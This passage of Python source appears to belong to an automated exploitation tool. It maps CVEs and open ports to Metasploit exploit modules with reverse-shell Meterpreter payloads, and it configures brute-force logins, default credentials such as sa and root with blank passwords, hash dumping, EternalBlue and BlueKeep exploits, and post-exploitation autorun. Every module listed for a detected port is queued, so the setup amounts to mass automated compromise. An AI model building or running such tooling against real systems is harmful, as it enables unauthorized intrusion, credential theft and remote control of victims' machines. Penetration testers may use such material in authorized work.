    "CVE-2022-35405": {"module": "exploit/multi/http/zoho_manageengine_servicedesk_rce", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Apache Solr velocity template RCE ────────────────────────
    "CVE-2019-17558": {"module": "exploit/multi/http/solr_velocity_rce",            "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-27905": {"module": "exploit/multi/http/solr_velocity_rce",            "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Hadoop YARN unauthenticated RCE ──────────────────────────
    "CVE-2016-6811":  {"module": "exploit/multi/http/hadoop_yarn_rce",              "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Cacti command injection ───────────────────────────────────
    "CVE-2022-46169": {"module": "exploit/multi/http/cacti_unauthenticated_cmd_injection", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Nagios XI ────────────────────────────────────────────────
    "CVE-2019-20197": {"module": "exploit/linux/http/nagios_xi_rce",                "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Kibana (prototype pollution RCE) ─────────────────────────
    "CVE-2019-7609":  {"module": "exploit/multi/http/kibana_timelion_rce",          "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ═══════════════════════════════════════════════════════════════
    # ══  2023–2026 High-Priority CVEs with MSF Modules  ═══════════
    # ═══════════════════════════════════════════════════════════════

    # ── Cisco IOS XE Web UI (critical 2023 exploit) ───────────────
    "CVE-2023-20198": {"module": "exploit/multi/http/cisco_ios_xe_webui_rce",       "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-20273": {"module": "exploit/multi/http/cisco_ios_xe_webui_rce",       "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── PHP CGI RCE (2024 — Windows only) ────────────────────────
    "CVE-2024-4577":  {"module": "exploit/multi/http/php_cgi_rce_cve_2024_4577",    "payload": "php/meterpreter/reverse_tcp"},

    # ── Jenkins CLI file read → RCE ───────────────────────────────
    "CVE-2024-23897": {"module": "exploit/multi/http/jenkins_cli_rce_cve_2024_23897", "payload": "java/meterpreter/reverse_tcp"},

    # ── Apache Struts 2 (S6 — file upload RCE 2023) ──────────────
    "CVE-2023-50164": {"module": "exploit/multi/http/struts2_s6_file_upload_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Fortinet SSL VPN heap overflow (2024) ─────────────────────
    "CVE-2024-21762": {"module": "exploit/multi/http/fortios_ssl_vpn_rce",          "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── FortiClientEMS SQL injection RCE ─────────────────────────
    "CVE-2023-48788": {"module": "exploit/multi/http/forticlientems_sqli_rce",      "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Palo Alto PAN-OS GlobalProtect OS command injection ───────
    "CVE-2024-3400":  {"module": "exploit/multi/http/panos_globalprotect_rce",      "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Palo Alto PAN-OS authentication bypass ────────────────────
    "CVE-2024-0012":  {"module": "auxiliary/scanner/http/palo_alto_auth_bypass",    "payload": None},

    # ── VMware vCenter (critical 2023 RCE) ───────────────────────
    "CVE-2023-34048": {"module": "exploit/multi/http/vmware_vcenter_rce_cve_2023_34048", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── VMware ESXi OpenSLP heap overflow ────────────────────────
    "CVE-2021-21974": {"module": "exploit/linux/misc/vmware_openslp_rce",           "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── ownCloud file disclosure ──────────────────────────────────
    "CVE-2023-49103": {"module": "auxiliary/scanner/http/owncloud_info_disclosure",  "payload": None},

    # ── WinRAR code execution via crafted archive ─────────────────
    "CVE-2023-38831": {"module": "exploit/windows/fileformat/winrar_cve_2023_38831", "payload": "windows/meterpreter/reverse_tcp"},

    # ── Windows SmartScreen bypass ────────────────────────────────
    "CVE-2023-24880": {"module": "exploit/windows/local/cve_2023_24880_smartscreen", "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── MOVEit SFTP SQLi (2024) ───────────────────────────────────
    "CVE-2024-5806":  {"module": "exploit/multi/http/moveit_sftp_sqli",             "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Progress WhatsUp Gold ─────────────────────────────────────
    "CVE-2024-4885":  {"module": "exploit/multi/http/whatsup_gold_rce",             "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── CrushFTP VFS file read (2024) ────────────────────────────
    "CVE-2024-4040":  {"module": "auxiliary/scanner/http/crushftp_vfs_read",        "payload": None},

    # ── Veeam Backup & Replication RCE ───────────────────────────
    "CVE-2024-40711": {"module": "exploit/multi/http/veeam_backup_rce",             "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2023-27532": {"module": "exploit/multi/http/veeam_b_and_r_rce",            "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Ivanti Endpoint Manager (2024) ───────────────────────────
    "CVE-2024-29824": {"module": "exploit/multi/http/ivanti_epm_sqli_rce",          "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── SolarWinds Web Help Desk ──────────────────────────────────
    "CVE-2024-28986": {"module": "exploit/multi/http/solarwinds_webhelpdesk_rce",   "payload": "java/meterpreter/reverse_tcp"},

    # ── Rejetto HTTP File Server (RCE via HFS) ────────────────────
    "CVE-2024-23692": {"module": "exploit/windows/http/rejetto_hfs_exec_cve_2024_23692", "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2014-6287":  {"module": "exploit/windows/http/rejetto_hfs_exec",           "payload": "windows/meterpreter/reverse_tcp"},

    # ── Apache HugeGraph Server RCE ──────────────────────────────
    "CVE-2024-27348": {"module": "exploit/multi/http/hugegraph_server_rce",         "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Exim mail server RCE ──────────────────────────────────────
    "CVE-2019-15846": {"module": "exploit/linux/smtp/exim4_string_format",          "payload": "linux/x86/meterpreter/reverse_tcp"},
    "CVE-2023-42115": {"module": "exploit/linux/smtp/exim_spf_rce",                 "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Ivanti DSM (2025 era) ─────────────────────────────────────
    "CVE-2025-0282": {"module": "exploit/multi/http/ivanti_connect_secure_rce",     "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── GitLab (additional) ───────────────────────────────────────
    "CVE-2024-0402": {"module": "exploit/multi/http/gitlab_filewrite_rce",          "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Magento / Adobe Commerce ──────────────────────────────────
    "CVE-2022-24086": {"module": "exploit/multi/http/magento_unserialize_rce",      "payload": "php/meterpreter/reverse_tcp"},

    # ── PrestaShop SQLi ───────────────────────────────────────────
    "CVE-2023-30839": {"module": "auxiliary/scanner/http/prestashop_sqli",          "payload": None},

    # ── WordPress (classic exploitable vulns) ─────────────────────
    "CVE-2022-21661": {"module": "auxiliary/scanner/http/wordpress_xmlrpc_login",   "payload": None},
    "CVE-2019-9978":  {"module": "exploit/multi/http/wp_social_warfare_rce",        "payload": "php/meterpreter/reverse_tcp"},

    # ── Splunk RCE ───────────────────────────────────────────────
    "CVE-2023-46214": {"module": "exploit/multi/http/splunk_xslt_injection_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── OpenNMS RCE ───────────────────────────────────────────────
    "CVE-2023-0845":  {"module": "exploit/multi/http/opennms_rce",                  "payload": "java/meterpreter/reverse_tcp"},

    # ── Ivanti Sentry (2023) ──────────────────────────────────────
    "CVE-2023-38035": {"module": "exploit/multi/http/ivanti_sentry_rce",            "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── GLPI (IT asset management) ────────────────────────────────
    "CVE-2023-35924": {"module": "exploit/multi/http/glpi_unauth_rce",              "payload": "php/meterpreter/reverse_tcp"},

    # ── Lexmark printer RCE ───────────────────────────────────────
    "CVE-2023-26067": {"module": "exploit/multi/http/lexmark_markvision_rce",       "payload": "linux/x64/meterpreter/reverse_tcp"},

}


# ─────────────────────────────────────────────────────────────────────────────
# PORT → All MSF Modules Mapping
#
# For every open TCP port detected by nmap, ALL entries in the list are queued.
# Structure per entry:
#   "m"    : module path (required)
#   "p"    : payload (optional, None for auxiliary)
#   "x"    : extra options dict (optional)
#   "cred" : True = inject username/password from CLI args when provided
#   "post" : True = attach AutoRunScript post-exploitation RC
# ─────────────────────────────────────────────────────────────────────────────

PORT_TO_MODULES: dict[int, list[dict]] = {

    # ── FTP (21) ──────────────────────────────────────────────────────────────
    21: [
        {"m": "auxiliary/scanner/ftp/ftp_version"},
        {"m": "auxiliary/scanner/ftp/anonymous"},
        {"m": "auxiliary/scanner/ftp/ftp_login",
         "x": {"BLANK_PASSWORDS": "true", "USER_AS_PASS": "true", "STOP_ON_SUCCESS": "false",
               "USER_FILE": "/usr/share/metasploit-framework/data/wordlists/unix_users.txt",
               "PASS_FILE": "/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"},
         "cred": True},
        # OS + version filters: only try specific backdoor if banner matches
        {"m": "exploit/unix/ftp/vsftpd_234_backdoor",
         "p": "cmd/unix/interact",           "post": True,
         "os": "linux",  "ver": "vsftpd 2.3.4"},
        {"m": "exploit/unix/ftp/proftpd_133c_backdoor",
         "p": "cmd/unix/reverse",
         "os": "linux",  "ver": "proftpd 1.3.3"},
        {"m": "exploit/linux/ftp/proftp_telnet_iac",
         "p": "linux/x86/meterpreter/reverse_tcp", "post": True,
         "os": "linux",  "ver": "proftpd"},
        {"m": "exploit/windows/ftp/ms09_053_ftpd_nlst",
         "p": "windows/meterpreter/reverse_tcp",   "post": True,
         "os": "windows", "ver": "microsoft ftp"},
    ],

    # ── SSH (22) ──────────────────────────────────────────────────────────────
    22: [
        {"m": "auxiliary/scanner/ssh/ssh_version"},
        {"m": "auxiliary/scanner/ssh/ssh_enumusers",
         "x": {"USER_FILE": "/usr/share/metasploit-framework/data/wordlists/unix_users.txt"}},
        {"m": "auxiliary/scanner/ssh/ssh_identify_pubkeys"},
        {"m": "auxiliary/scanner/ssh/ssh_login",
         "x": {"BLANK_PASSWORDS": "true", "USER_AS_PASS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
        {"m": "exploit/linux/ssh/libssh_auth_bypass",
         "p": "linux/x64/meterpreter/reverse_tcp", "post": True,
         "os": "linux", "ver": "libssh"},
        {"m": "exploit/linux/ssh/openssh_regresshion",
         "p": "linux/x64/meterpreter/reverse_tcp", "post": True,
         "os": "linux", "ver": "openssh"},
        # sshexec requires valid credentials (blank/user-as-pass won't work)
        {"m": "exploit/multi/ssh/sshexec",
         "p": "cmd/unix/interact", "cred": True, "post": True,
         "needs_creds": True},
    ],

    # ── Telnet (23) ───────────────────────────────────────────────────────────
    23: [
        {"m": "auxiliary/scanner/telnet/telnet_version"},
        {"m": "auxiliary/scanner/telnet/telnet_login",
         "x": {"BLANK_PASSWORDS": "true"}, "cred": True},
        {"m": "auxiliary/scanner/telnet/telnet_encrypt_overflow"},
    ],

    # ── SMTP (25) ─────────────────────────────────────────────────────────────
    25: [
        {"m": "auxiliary/scanner/smtp/smtp_version"},
        {"m": "auxiliary/scanner/smtp/smtp_enum"},
        {"m": "auxiliary/scanner/smtp/smtp_relay"},
        {"m": "auxiliary/scanner/smtp/smtp_ntlm_domain"},
    ],

    # ── DNS (53) ──────────────────────────────────────────────────────────────
    53: [
        {"m": "auxiliary/gather/dns_info"},
        {"m": "auxiliary/scanner/dns/dns_amp"},
    ],

    # ── TFTP (69) ─────────────────────────────────────────────────────────────
    69: [
        {"m": "auxiliary/scanner/tftp/tftpbrute"},
    ],

    # ── HTTP (80) ─────────────────────────────────────────────────────────────
    80: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "80"}},
        # ntlm_info renamed to ntlm_info_enumeration in MSF 6.4
        {"m": "auxiliary/scanner/http/ntlm_info_enumeration",  "x": {"RPORT": "80"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "80"}},
        {"m": "auxiliary/scanner/http/options",                "x": {"RPORT": "80"}},
        {"m": "auxiliary/scanner/http/webdav_scanner",         "x": {"RPORT": "80"}},
        {"m": "auxiliary/scanner/http/http_put",               "x": {"RPORT": "80"}},
        # cert on port 80: explicitly set SSL false to avoid ECONNRESET
        {"m": "auxiliary/scanner/http/cert",                   "x": {"RPORT": "80", "SSL": "false"}},
        {"m": "auxiliary/scanner/http/coldfusion_version",     "x": {"RPORT": "80"}},
        {"m": "auxiliary/scanner/http/glassfish_traversal",    "x": {"RPORT": "80"}},
        {"m": "auxiliary/scanner/http/joomla_version",         "x": {"RPORT": "80"}},
        {"m": "auxiliary/scanner/http/tomcat_mgr_login",       "x": {"RPORT": "80"}},
        {"m": "auxiliary/scanner/http/wordpress_xmlrpc_login", "x": {"RPORT": "80"}},
        # phpinfo — removed (deprecated, not available in MSF 6.4)
        {"m": "auxiliary/scanner/http/rails_mass_assignment",  "x": {"RPORT": "80"}},
        # apache_optionsbleed: only relevant on Apache servers
        {"m": "auxiliary/scanner/http/apache_optionsbleed",    "x": {"RPORT": "80"}, "ver": "apache"},
        {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "80"}, "cred": True},
        {"m": "auxiliary/scanner/http/drupal_views_user_enum", "x": {"RPORT": "80"}},
        {"m": "auxiliary/scanner/http/grafana_plugin_traversal","x": {"RPORT": "80"}},
        # Shellshock: Linux CGI only, and only if Apache is detected
        {"m": "exploit/multi/http/apache_mod_cgi_bash_env_exec","p": "linux/x86/meterpreter/reverse_tcp",
         "x": {"RPORT": "80", "TARGETURI": "/cgi-bin/test.cgi"}, "post": True,
         "os": "linux", "ver": "apache"},
        # webdav_upload_asp — removed (deprecated, not available in MSF 6.4)
    ],

    # ── POP3 (110) ────────────────────────────────────────────────────────────
    110: [
        {"m": "auxiliary/scanner/pop3/pop3_version"},
        {"m": "auxiliary/scanner/pop3/pop3_login",
         "x": {"BLANK_PASSWORDS": "true"}, "cred": True},
    ],

    # ── IMAP (143) ────────────────────────────────────────────────────────────
    143: [
        {"m": "auxiliary/scanner/imap/imap_version"},
        {"m": "auxiliary/scanner/imap/imap_login",
         "x": {"BLANK_PASSWORDS": "true"}, "cred": True},
    ],

    # ── SNMP (161) ────────────────────────────────────────────────────────────
    161: [
        {"m": "auxiliary/scanner/snmp/snmp_enum"},
        {"m": "auxiliary/scanner/snmp/snmp_enumshares"},
        {"m": "auxiliary/scanner/snmp/snmp_enumusers"},
        {"m": "auxiliary/scanner/snmp/snmp_login",             "x": {"VERSION": "1"}},
    ],

    # ── NetBIOS/SMB (139) ─────────────────────────────────────────────────────
    139: [
        {"m": "auxiliary/scanner/netbios/nbname"},
        {"m": "auxiliary/scanner/smb/smb_version",             "x": {"RPORT": "139"}},
    ],

    # ── LDAP (389) ────────────────────────────────────────────────────────────
    389: [
        {"m": "auxiliary/scanner/ldap/ldap_login",             "cred": True},
        {"m": "auxiliary/scanner/ldap/ldap_hashdump",          "cred": True},
    ],

    # ── HTTPS (443) ───────────────────────────────────────────────────────────
    443: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "443", "SSL": "true"}},
        # ntlm_info renamed to ntlm_info_enumeration in MSF 6.4
        {"m": "auxiliary/scanner/http/ntlm_info_enumeration",  "x": {"RPORT": "443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/options",                "x": {"RPORT": "443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/webdav_scanner",         "x": {"RPORT": "443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/cert",                   "x": {"RPORT": "443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/tomcat_mgr_login",       "x": {"RPORT": "443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/wordpress_xmlrpc_login", "x": {"RPORT": "443", "SSL": "true"}},
        {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "443", "SSL": "true"}, "cred": True},
        {"m": "auxiliary/scanner/ssl/openssl_heartbleed",      "x": {"RPORT": "443"}},
        {"m": "auxiliary/scanner/ssl/openssl_ccs",             "x": {"RPORT": "443"}},
        # Shellshock: Linux CGI only, and only if Apache is detected
        {"m": "exploit/multi/http/apache_mod_cgi_bash_env_exec","p": "linux/x86/meterpreter/reverse_tcp",
         "x": {"RPORT": "443", "SSL": "true", "TARGETURI": "/cgi-bin/test.cgi"}, "post": True,
         "os": "linux", "ver": "apache"},
    ],

    # ── MSRPC/DCOM (135) ─────────────────────────────────────────────────────
    135: [
        {"m": "auxiliary/scanner/dcerpc/endpoint_mapper"},
        {"m": "auxiliary/scanner/dcerpc/hidden"},
        {"m": "auxiliary/scanner/dcerpc/management"},
        {"m": "auxiliary/scanner/dcerpc/tcp_dcerpc_auditor"},
        {"m": "exploit/windows/smb/ms03_026_dcom",
         "p": "windows/meterpreter/reverse_tcp", "post": True, "os": "windows"},
    ],

    # ── SMB (445) ─────────────────────────────────────────────────────────────
    445: [
        {"m": "auxiliary/scanner/smb/smb_version"},
        {"m": "auxiliary/scanner/smb/smb_ms17_010"},
        {"m": "auxiliary/scanner/smb/smb_enumshares",          "cred": True},
        {"m": "auxiliary/scanner/smb/smb_enumusers",           "cred": True},
        {"m": "auxiliary/scanner/smb/smb_lookupsid",           "x": {"MinRID": "500", "MaxRID": "2000"}},
        {"m": "auxiliary/scanner/smb/pipe_auditor",            "cred": True},
        {"m": "auxiliary/scanner/smb/smb_login",
         "x": {"BLANK_PASSWORDS": "true", "USER_AS_PASS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
        # Windows-only SMB exploits
        {"m": "exploit/windows/smb/ms17_010_eternalblue",
         "p": "windows/x64/meterpreter/reverse_tcp", "post": True, "os": "windows"},
        {"m": "exploit/windows/smb/ms17_010_psexec",
         "p": "windows/x64/meterpreter/reverse_tcp", "post": True, "os": "windows"},
        {"m": "exploit/windows/smb/ms08_067_netapi",
         "p": "windows/meterpreter/reverse_tcp",     "post": True, "os": "windows"},
        {"m": "exploit/windows/smb/ms06_040_netapi",
         "p": "windows/meterpreter/reverse_tcp",     "post": True, "os": "windows"},
        {"m": "exploit/windows/smb/ms10_061_spoolss",
         "p": "windows/meterpreter/reverse_tcp",     "post": True, "os": "windows"},
        # Linux/Samba exploits
        {"m": "exploit/linux/samba/is_known_pipename",
         "p": "linux/x86/meterpreter/reverse_tcp",   "post": True, "os": "linux"},
        {"m": "exploit/multi/samba/usermap_script",
         "p": "cmd/unix/interact",                   "post": True, "os": "linux"},
    ],

    # ── Kerberos (88) ─────────────────────────────────────────────────────────
    88: [
        {"m": "auxiliary/scanner/kerberos/kerberos_login",     "cred": True},
        {"m": "auxiliary/gather/kerberos_enumusers"},
    ],

    # ── POP3S (995) / IMAPS (993) ─────────────────────────────────────────────
    993: [{"m": "auxiliary/scanner/imap/imap_version",          "x": {"RPORT": "993", "SSL": "true"}}],
    995: [{"m": "auxiliary/scanner/pop3/pop3_version",          "x": {"RPORT": "995", "SSL": "true"}}],

    # ── MSSQL (1433) ─────────────────────────────────────────────────────────
    1433: [
        {"m": "auxiliary/scanner/mssql/mssql_ping"},
        # Login scanner: always try (uses BLANK_PASSWORDS + USER_AS_PASS)
        {"m": "auxiliary/scanner/mssql/mssql_login",
         "x": {"USER_AS_PASS": "true", "BLANK_PASSWORDS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
        # Post-auth modules: default sa/"" for common misconfiguration.
        # needs_creds: True = skip entirely if no --username provided via CLI.
        {"m": "auxiliary/scanner/mssql/mssql_config_enum",
         "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
        {"m": "auxiliary/scanner/mssql/mssql_hashdump",
         "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
        {"m": "auxiliary/admin/mssql/mssql_enum",
         "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
        {"m": "auxiliary/admin/mssql/mssql_enum_sql_logins",
         "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
        {"m": "auxiliary/admin/mssql/mssql_exec",
         "x": {"USERNAME": "sa", "PASSWORD": "", "CMD": "whoami /all"},
         "cred": True, "needs_creds": True},
        # Exploits: Windows only + needs explicit creds
        {"m": "exploit/windows/mssql/mssql_payload",
         "x": {"USERNAME": "sa", "PASSWORD": ""},
         "p": "windows/x64/meterpreter/reverse_tcp", "cred": True, "post": True,
         "os": "windows", "needs_creds": True},
        {"m": "exploit/windows/mssql/mssql_clr_payload",
         "x": {"USERNAME": "sa", "PASSWORD": ""},
         "p": "windows/x64/meterpreter/reverse_tcp", "cred": True, "post": True,
         "os": "windows", "needs_creds": True},
    ],

    # ── Oracle DB (1521) ─────────────────────────────────────────────────────
    1521: [
        # Default Oracle creds: system/oracle is the most common misconfiguration
        {"m": "auxiliary/scanner/oracle/oracle_login",
         "x": {"USERNAME": "system", "PASSWORD": "oracle"}, "cred": True},
        {"m": "auxiliary/scanner/oracle/oracle_sid"},
        {"m": "auxiliary/admin/oracle/oracle_enum_users",
         "x": {"USERNAME": "system", "PASSWORD": "oracle"}, "cred": True},
        {"m": "exploit/windows/oracle/oracle_dbms_scheduler",
         "x": {"USERNAME": "system", "PASSWORD": "oracle"},
         "p": "windows/meterpreter/reverse_tcp", "cred": True, "post": True,
         "os": "windows", "needs_creds": True},
        {"m": "exploit/multi/misc/oracle_jvm_os_code_execution",
         "x": {"USERNAME": "system", "PASSWORD": "oracle"},
         "p": "java/meterpreter/reverse_tcp",    "cred": True, "post": True,
         "needs_creds": True},
    ],

    # ── NFS (2049) ────────────────────────────────────────────────────────────
    2049: [
        {"m": "auxiliary/scanner/nfs/nfsmount"},
    ],

    # ── ZooKeeper (2181) ─────────────────────────────────────────────────────
    2181: [
        {"m": "auxiliary/scanner/zookeeper/zookeeper_info"},
    ],

    # ── Docker API (2375) ─────────────────────────────────────────────────────
    2375: [
        {"m": "exploit/linux/http/docker_daemon_tcp_rce",      "p": "linux/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "2375"},                               "post": True},
    ],

    # ── Docker API TLS (2376) ─────────────────────────────────────────────────
    2376: [
        {"m": "exploit/linux/http/docker_daemon_tcp_rce",      "p": "linux/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "2376", "SSL": "true"},               "post": True},
    ],

    # ── Grafana / Node.js (3000) ─────────────────────────────────────────────
    3000: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "3000"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "3000"}},
        {"m": "auxiliary/scanner/http/grafana_plugin_traversal","x": {"RPORT": "3000"}},
        {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "3000"}, "cred": True},
    ],

    # ── MySQL (3306) ─────────────────────────────────────────────────────────
    3306: [
        {"m": "auxiliary/scanner/mysql/mysql_version"},
        {"m": "auxiliary/scanner/mysql/mysql_login",
         "x": {"USER_AS_PASS": "true", "BLANK_PASSWORDS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
        # mysql_authbypass_hashdump: no creds needed, pure bypass attempt
        {"m": "auxiliary/scanner/mysql/mysql_authbypass_hashdump"},
        # Post-auth modules: default to root/"" so MSF required options are satisfied.
        # CLI --username/--password always override these defaults (see Change 8).
        {"m": "auxiliary/scanner/mysql/mysql_hashdump",
         "x": {"USERNAME": "root", "PASSWORD": ""},                "cred": True},
        {"m": "auxiliary/scanner/mysql/mysql_file_enum",
         "x": {"USERNAME": "root", "PASSWORD": "",
               "FILE_LIST": "/usr/share/metasploit-framework/data/wordlists/sensitive_files.txt"},
         "cred": True},
        {"m": "auxiliary/scanner/mysql/mysql_schemadump",
         "x": {"USERNAME": "root", "PASSWORD": ""},                "cred": True},
        {"m": "auxiliary/admin/mysql/mysql_enum",
         "x": {"USERNAME": "root", "PASSWORD": ""},                "cred": True},
        {"m": "auxiliary/admin/mysql/mysql_sql",
         "x": {"USERNAME": "root", "PASSWORD": "",
               "SQL": "SELECT user(), version(), @@datadir, @@global.secure_file_priv"},
         "cred": True},
        # OS-split MySQL exploits: UDF = Linux, MOF = Windows
        {"m": "exploit/multi/mysql/mysql_udf_payload",
         "x": {"USERNAME": "root", "PASSWORD": ""},
         "p": "linux/x64/meterpreter/reverse_tcp", "cred": True, "post": True,
         "os": "linux"},
        {"m": "exploit/windows/mysql/mysql_mof",
         "x": {"USERNAME": "root", "PASSWORD": ""},
         "p": "windows/meterpreter/reverse_tcp",   "cred": True, "post": True,
         "os": "windows"},
    ],

    # ── LDAP Global Catalog (3268/3269) ───────────────────────────────────────
    3268: [{"m": "auxiliary/scanner/ldap/ldap_login",          "x": {"RPORT": "3268"},  "cred": True}],
    3269: [{"m": "auxiliary/scanner/ldap/ldap_login",          "x": {"RPORT": "3269", "SSL": "true"}, "cred": True}],

    # ── RDP (3389) ────────────────────────────────────────────────────────────
    3389: [
        {"m": "auxiliary/scanner/rdp/rdp_scanner"},
        {"m": "auxiliary/scanner/rdp/ms12_020_check"},
        {"m": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
         "p": "windows/x64/meterpreter/reverse_tcp", "post": True, "os": "windows"},
        {"m": "exploit/windows/rdp/cve_2019_1182_dejablue",
         "p": "windows/x64/meterpreter/reverse_tcp", "post": True, "os": "windows"},
    ],

    # ── PostgreSQL (5432) ─────────────────────────────────────────────────────
    5432: [
        {"m": "auxiliary/scanner/postgres/postgres_version"},
        {"m": "auxiliary/scanner/postgres/postgres_login",
         "x": {"USER_AS_PASS": "true", "BLANK_PASSWORDS": "true"}, "cred": True},
        # Default PostgreSQL creds: postgres/""
        {"m": "auxiliary/admin/postgres/postgres_sql",
         "x": {"USERNAME": "postgres", "PASSWORD": "",
               "SQL": "SELECT version(), current_user, pg_postmaster_start_time()"},
         "cred": True},
        # CVE-2019-9193: Linux only, needs valid creds
        {"m": "exploit/multi/postgres/postgres_copy_from_program_cmd_exec",
         "x": {"USERNAME": "postgres", "PASSWORD": ""},
         "p": "cmd/unix/interact", "cred": True, "post": True,
         "os": "linux", "needs_creds": True},
    ],

    # ── WinRM HTTP (5985) ─────────────────────────────────────────────────────
    5985: [
        {"m": "auxiliary/scanner/winrm/winrm_auth_methods"},
        {"m": "auxiliary/scanner/winrm/winrm_login",           "cred": True,
         "x": {"BLANK_PASSWORDS": "true"}},
        {"m": "exploit/windows/winrm/winrm_script_exec",
         "p": "windows/x64/meterpreter/reverse_tcp",
         "x": {"FORCE_VBS": "true"}, "cred": True, "post": True, "os": "windows"},
    ],

    # ── WinRM HTTPS (5986) ────────────────────────────────────────────────────
    5986: [
        {"m": "auxiliary/scanner/winrm/winrm_auth_methods",    "x": {"RPORT": "5986", "SSL": "true"}},
        {"m": "auxiliary/scanner/winrm/winrm_login",           "x": {"RPORT": "5986", "SSL": "true"}, "cred": True},
        {"m": "exploit/windows/winrm/winrm_script_exec",
         "p": "windows/x64/meterpreter/reverse_tcp",
         "x": {"RPORT": "5986", "SSL": "true", "FORCE_VBS": "true"},
         "cred": True, "post": True, "os": "windows"},
    ],

    # ── VNC (5900-5903) ───────────────────────────────────────────────────────
    5900: [
        {"m": "auxiliary/scanner/vnc/vnc_none_auth"},
        {"m": "auxiliary/scanner/vnc/vnc_login",
         "x": {"BLANK_PASSWORDS": "true"}, "cred": True},
    ],
    5901: [
        {"m": "auxiliary/scanner/vnc/vnc_none_auth",           "x": {"RPORT": "5901"}},
        {"m": "auxiliary/scanner/vnc/vnc_login",               "x": {"RPORT": "5901"}},
    ],
    5902: [
        {"m": "auxiliary/scanner/vnc/vnc_none_auth",           "x": {"RPORT": "5902"}},
    ],

    # ── CouchDB (5984) ────────────────────────────────────────────────────────
    5984: [
        {"m": "auxiliary/scanner/couchdb/couchdb_login",       "cred": True},
        {"m": "exploit/linux/http/couchdb_cmd_exec",           "p": "linux/x64/meterpreter/reverse_tcp", "post": True},
    ],

    # ── IRC (6667) ────────────────────────────────────────────────────────────
    6667: [
        {"m": "exploit/unix/irc/unreal_ircd_3281_backdoor",
         "p": "cmd/unix/interact", "post": True,
         "os": "linux", "ver": "unreal"},
    ],

    # ── X11 (6000) ────────────────────────────────────────────────────────────
    6000: [
        {"m": "auxiliary/scanner/x11/open_x11"},
        {"m": "exploit/unix/x11/x11_keyboard_exec",            "p": "cmd/unix/interact", "post": True},
    ],

    # ── Redis (6379) ─────────────────────────────────────────────────────────
    6379: [
        {"m": "auxiliary/scanner/redis/redis_server"},
        {"m": "auxiliary/scanner/redis/redis_login",
         "x": {"BLANK_PASSWORDS": "true"}, "cred": True},
        {"m": "exploit/linux/redis/redis_replication_cmd_exec",
         "p": "linux/x64/meterpreter/reverse_tcp", "post": True, "os": "linux"},
        {"m": "exploit/linux/redis/redis_lua_sandbox_escape",
         "p": "linux/x64/meterpreter/reverse_tcp", "post": True, "os": "linux"},
    ],

    # ── WebLogic (7001/7002) ──────────────────────────────────────────────────
    7001: [
        {"m": "auxiliary/scanner/http/http_version",           "x": {"RPORT": "7001"}},
        {"m": "auxiliary/scanner/http/title",                  "x": {"RPORT": "7001"}},
        {"m": "exploit/multi/http/oracle_weblogic_wls_rce",    "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "7001"}, "post": True},
        {"m": "exploit/multi/misc/weblogic_deserialize_asyncresponseservice",
         "p": "java/meterpreter/reverse_tcp",                  "x": {"RPORT": "7001"}, "post": True},
        {"m": "exploit/multi/misc/weblogic_deserialize_marshalledobject",
         "p": "java/meterpreter/reverse_tcp",                  "x": {"RPORT": "7001"}, "post": True},
    ],
    7002: [
        {"m": "exploit/multi/http/oracle_weblogic_wls_rce",    "p": "java/meterpreter/reverse_tcp",
         "x": {"RPORT": "7002", "SSL": "true"}, "post": True},
    ],

